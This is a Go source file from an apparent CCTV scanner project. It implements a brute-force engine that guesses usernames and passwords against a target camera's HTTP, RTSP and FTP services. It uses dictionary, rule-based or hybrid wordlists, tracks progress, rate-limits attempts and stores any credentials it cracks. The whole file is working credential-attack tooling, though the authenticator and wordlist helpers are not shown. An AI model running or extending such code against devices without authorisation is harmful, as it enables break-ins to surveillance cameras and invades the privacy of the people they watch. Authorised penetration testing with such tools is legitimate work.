package bruteforce

import (
	"fmt"
	"sync"
	"time"

	"github.com/gatiella/cctv-scanner/pkg/models"
	"github.com/google/uuid"
)

type AttackSession struct {
	ID              string
	TargetIP        string
	TargetPort      int
	Method          string // dictionary, rules, hybrid
	Wordlist        string // default, extended, custom
	CustomPasswords []string
	TestHTTP        bool
	TestRTSP        bool
	TestFTP         bool
	StopOnSuccess   bool
	RateLimit       int
	Status          string // running, completed, failed, stopped
	Progress        int
	Tested          int
	Total           int
	StartTime       time.Time
	EndTime         *time.Time
	Credentials     []models.Credential
	Error           string
	authenticator   *Authenticator
	stopChan        chan bool
	mu              sync.RWMutex
}

type BruteForceEngine struct {
	sessions map[string]*AttackSession
	mu       sync.RWMutex
}

func NewBruteForceEngine() *BruteForceEngine {
	return &BruteForceEngine{
		sessions: make(map[string]*AttackSession),
	}
}

func (bfe *BruteForceEngine) StartAttack(req AttackRequest) (string, error) {
	attackID := uuid.New().String()

	session := &AttackSession{
		ID:              attackID,
		TargetIP:        req.IP,
		TargetPort:      req.Port,
		Method:          req.Method,
		Wordlist:        req.Wordlist,
		CustomPasswords: req.CustomPasswords,
		TestHTTP:        req.TestHTTP,
		TestRTSP:        req.TestRTSP,
		TestFTP:         req.TestFTP,
		StopOnSuccess:   req.StopOnSuccess,
		RateLimit:       req.RateLimit,
		Status:          "running",
		Progress:        0,
		Tested:          0,
		StartTime:       time.Now(),
		Credentials:     make([]models.Credential, 0),
		authenticator:   NewAuthenticator(req.IP, req.Port),
		stopChan:        make(chan bool, 1),
	}

	bfe.mu.Lock()
	bfe.sessions[attackID] = session
	bfe.mu.Unlock()

	// Start attack in background
	go bfe.performAttack(session)

	return attackID, nil
}

func (bfe *BruteForceEngine) performAttack(session *AttackSession) {
	defer func() {
		endTime := time.Now()
		session.mu.Lock()
		session.EndTime = &endTime
		if session.Status == "running" {
			session.Status = "completed"
		}
		session.mu.Unlock()
	}()

	// Generate password list based on method
	var passwords []PasswordCandidate
	var err error

	switch session.Method {
	case "dictionary":
		passwords, err = GetDictionaryPasswords(session.Wordlist, session.CustomPasswords)
	case "rules":
		passwords, err = GenerateRuleBasedPasswords(session.TargetIP, session.Wordlist)
	case "hybrid":
		passwords, err = GenerateHybridPasswords(session.TargetIP, session.Wordlist)
	default:
		passwords, err = GetDictionaryPasswords("default", nil)
	}

	if err != nil {
		session.mu.Lock()
		session.Status = "failed"
		session.Error = err.Error()
		session.mu.Unlock()
		return
	}

	session.mu.Lock()
	session.Total = len(passwords)
	session.mu.Unlock()

	// Rate limiter
	rateLimiter := time.NewTicker(time.Second / time.Duration(session.RateLimit))
	defer rateLimiter.Stop()

	attempts := 0

	for _, candidate := range passwords {
		// Check if stopped
		select {
		case <-session.stopChan:
			session.mu.Lock()
			session.Status = "stopped"
			session.mu.Unlock()
			return
		default:
		}

		// Rate limiting
		<-rateLimiter.C

		attempts++

		// Test credentials
		protocols := []string{}
		if session.TestHTTP {
			protocols = append(protocols, "HTTP")
		}
		if session.TestRTSP {
			protocols = append(protocols, "RTSP")
		}
		if session.TestFTP {
			protocols = append(protocols, "FTP")
		}

		for _, protocol := range protocols {
			success, err := session.authenticator.TestCredential(
				candidate.Username,
				candidate.Password,
				protocol,
			)

			if err == nil && success {
				cred := models.Credential{
					IP:                    session.TargetIP,
					Port:                  session.TargetPort,
					Username:              candidate.Username,
					Password:              candidate.Password,
					Protocol:              protocol,
					DiscoveredAt:          time.Now(),
					AttemptsBeforeSuccess: attempts,
				}

				session.mu.Lock()
				session.Credentials = append(session.Credentials, cred)
				session.mu.Unlock()

				if session.StopOnSuccess {
					session.mu.Lock()
					session.Status = "completed"
					session.Progress = 100
					session.mu.Unlock()
					return
				}
			}
		}

		// Update progress
		session.mu.Lock()
		session.Tested = attempts
		session.Progress = int(float64(attempts) / float64(session.Total) * 100)
		session.mu.Unlock()
	}
}

func (bfe *BruteForceEngine) GetStatus(attackID string) (*AttackSession, error) {
	bfe.mu.RLock()
	defer bfe.mu.RUnlock()

	session, exists := bfe.sessions[attackID]
	if !exists {
		return nil, fmt.Errorf("attack session not found")
	}

	return session, nil
}

func (bfe *BruteForceEngine) StopAttack(attackID string) error {
	bfe.mu.RLock()
	session, exists := bfe.sessions[attackID]
	bfe.mu.RUnlock()

	if !exists {
		return fmt.Errorf("attack session not found")
	}

	session.stopChan <- true
	return nil
}

// GetStatusInfo returns a thread-safe copy of session status information
func (s *AttackSession) GetStatusInfo() map[string]interface{} {
	s.mu.RLock()
	defer s.mu.RUnlock()

	elapsedSeconds := 0
	if s.EndTime != nil {
		elapsedSeconds = int(s.EndTime.Sub(s.StartTime).Seconds())
	} else {
		elapsedSeconds = int(time.Since(s.StartTime).Seconds())
	}

	return map[string]interface{}{
		"attack_id":         s.ID,
		"status":            s.Status,
		"progress":          s.Progress,
		"tested":            s.Tested,
		"total":             s.Total,
		"elapsed_seconds":   elapsedSeconds,
		"found_credentials": s.Credentials,
		"error":             s.Error,
	}
}

// GetCredentials returns a thread-safe copy of credentials
func (s *AttackSession) GetCredentials() ([]models.Credential, int) {
	s.mu.RLock()
	defer s.mu.RUnlock()

	return s.Credentials, len(s.Credentials)
}

// AttackRequest represents a brute force attack request
type AttackRequest struct {
	IP              string   `json:"ip"`
	Port            int      `json:"port"`
	Method          string   `json:"method"`
	Wordlist        string   `json:"wordlist"`
	CustomPasswords []string `json:"custom_passwords"`
	TestHTTP        bool     `json:"test_http"`
	TestRTSP        bool     `json:"test_rtsp"`
	TestFTP         bool     `json:"test_ftp"`
	StopOnSuccess   bool     `json:"stop_on_success"`
	RateLimit       int      `json:"rate_limit"`
}